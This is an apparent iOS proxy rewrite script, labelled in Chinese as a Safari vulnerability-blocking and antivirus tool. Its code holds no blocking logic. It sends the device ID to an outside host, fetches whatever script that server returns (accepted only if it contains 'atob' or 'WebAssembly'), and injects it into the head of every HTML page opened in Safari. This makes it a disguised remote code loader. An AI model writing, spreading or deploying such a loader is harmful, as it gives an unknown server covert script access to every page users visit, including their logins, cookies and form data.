/**
 * Safari漏洞封堵&病毒防范脚本 (云端验证 Version)
 * 作者：fiywind
 * Safari 漏洞封堵 Loader (原生判定版)
 * 作用：仅在原生 Safari 中注入 lockDown 物理封堵逻辑
 * 更新：2026-04-08
 */


const ua = $request.headers['User-Agent'] || $request.headers['user-agent'] || "";
const contentType = $response.headers['Content-Type'] || $response.headers['content-type'] || "";
const url = $request.url || "";

// 1. 资源熔断：如果不是 HTML 网页或者是已知非 Safari 标识，瞬间退出
const isHtml = contentType && contentType.includes("text/html");
const isNativeSafari = ua.includes("Safari") && ua.includes("Version/");

if (!isHtml || !isNativeSafari || !$response.body) {
    $done({});
} else {
    const did = $environment.device_id;
    const authUrl = `https://bhip.cc.cd/?id=${did}`;

    $httpClient.get(authUrl, (err, resp, data) => {
        // 2. 只有当 Cloudflare 返回 200 (授权成功) 时才进行代码注入
        if (!err && resp.status === 200 && (data.includes("atob") || data.includes("WebAssembly"))) {
            const payload = `<script id="sh-ld-core">${data}</script>`;
            let newBody = $response.body.replace(/<head[^>]*>/i, `$&${payload}`);
            $done({ body: newBody });
        } else {
            // 3. 授权失败 (如 403 Unauthorized) 或网络错误，安静放行原生页面
            $done({});
        }
    });
}
